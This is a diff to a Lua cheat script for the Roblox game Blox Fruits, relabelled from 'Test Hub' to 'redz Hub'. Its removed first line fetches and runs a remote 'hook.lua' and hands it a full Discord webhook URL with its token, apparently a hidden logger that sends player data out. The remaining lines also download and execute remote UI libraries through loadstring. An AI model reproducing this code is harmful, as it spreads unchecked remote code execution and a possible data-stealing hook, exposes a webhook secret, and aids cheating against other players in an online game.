@@ -1,4 +1,4 @@
-loadstring(game:HttpGet("https://raw.githubusercontent.com/OneCreatorX/OneCreatorX/main/Scripts/web/hook.lua"))()("https://discord.com/api/webhooks/1269383717567336604/dfE9AkUmFV__FB8oY52FRJ5mXdhOghSyvqh8Z7ykfmvD6U-VMpFqbgQ2alzhnTJsY_vc")()
+
 
 if game.PlaceId == 2753915549 then
     World1 = true
@@ -2541,29 +2541,15 @@ spawn(function()
     require(game.ReplicatedStorage.Notification).new("<Color=Yellow>Dev:Test Hub Hub<Color=/>"):Display()
 end)
 
-local OrionLib = loadstring(game:HttpGet(('https://raw.githubusercontent.com/shlexware/Orion/main/source')))()
-local Window = OrionLib:MakeWindow({Name = "Test Hub", HidePremium = false, IntroText = "Test Hub", SaveConfig = true, ConfigFolder = "Test Hub"})
+local redzlib = loadstring(game:HttpGet("https://raw.githubusercontent.com/REDzHUB/RedzLibV5/main/Source.Lua"))()
 
-OrionLib:MakeNotification({
-	Name = "Test Hub",
-	Content = "Choose Teams Bro?",
-	Image = "rbxassetid://4483345998",
-	Time = 7
+local Window = redzlib:MakeWindow({
+  Title = "redz Hub : Blox Fruits",
+  SubTitle = "by redz9999",
+  SaveFolder = "redz Hub | Blox Fruits.lua"
 })
 
-OrionLib:MakeNotification({
-	Name = "Test Hub",
-	Content = "Please Wait...",
-	Image = "rbxassetid://4483345998",
-	Time = 25
-})
 
-OrionLib:MakeNotification({
-    Name = "Test Hub",
-    Content = "Loading...",
-    Image = "rbxassetid://4483345998",
-    Time = 5
-})
 
 -------------Tab-----------------------
 
